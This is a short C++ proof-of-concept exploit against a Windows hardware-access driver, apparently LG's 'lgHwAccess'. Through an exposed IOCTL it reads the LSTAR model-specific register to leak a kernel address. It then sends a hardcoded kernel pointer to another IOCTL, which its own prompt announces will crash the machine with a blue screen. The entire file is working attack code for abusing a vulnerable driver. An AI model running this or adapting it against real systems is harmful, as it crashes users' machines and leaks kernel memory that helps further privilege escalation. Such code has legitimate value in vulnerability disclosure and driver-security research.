#include <windows.h>
#include <cstdio>
#include "ntos.h"

#define LG_DEVICE_TYPE      (DWORD)0xC350
#define LG_READVALUE        (DWORD)0x800
#define LG_READREFCOUNT     (DWORD)0x801
#define LG_READMSR          (DWORD)0x821

#define IOCTL_LG_READVALUE     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READVALUE, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_LG_READREFCOUNT     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READREFCOUNT, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_LG_READMSR     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _LG_READ_MSR {
    ULONG Affinity;
    ULONG Msr;
} LG_READ_MSR, * PLG_READ_MSR;

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\lgHwAccess"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] lgHwAccess device opened\r\n");
    }

    LG_READ_MSR request;
    ULONG_PTR msrLstar = 0;
    
    request.Affinity = (DWORD)-1;
    request.Msr = 0xC0000082;

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        IOCTL_LG_READMSR,
        &request,
        sizeof(request),
        &msrLstar,
        sizeof(msrLstar));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed to read LSTAR, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {

        printf_s("[+] IOCTL %lu succeeded, LSTAR = 0x%llx\r\n", IOCTL_LG_READMSR, msrLstar);
    }

    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    ULONG_PTR value = 0xfffff8041ad76d18;

    ntStatus = CallDriver(deviceHandle,
        IOCTL_LG_READVALUE,
        (PVOID)0xfffff801447e6d18,
        0,
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {
        printf_s("[+] IOCTL %lu succeeded\r\n", IOCTL_LG_READREFCOUNT);
    }

    CloseHandle(deviceHandle);

    return 0;
}
